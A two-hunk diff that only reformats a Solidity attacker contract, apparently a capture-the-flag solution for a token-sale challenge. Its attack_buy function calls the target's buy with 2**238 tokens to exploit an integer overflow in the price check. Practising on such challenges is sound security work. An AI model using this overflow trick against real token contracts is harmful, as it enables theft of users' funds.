@@ -7,7 +7,7 @@ contract TokenSaleChallengeAttacker {
 
     function attack_buy(address _target) public payable {
         target = TokenSaleChallenge(_target);
-        uint256 numTokens = 2**238;
+        uint256 numTokens = 2 ** 238;
         target.buy.value(msg.value)(numTokens);
     }
 
@@ -17,5 +17,4 @@ contract TokenSaleChallengeAttacker {
     }
 
     function() public payable {}
-
 }
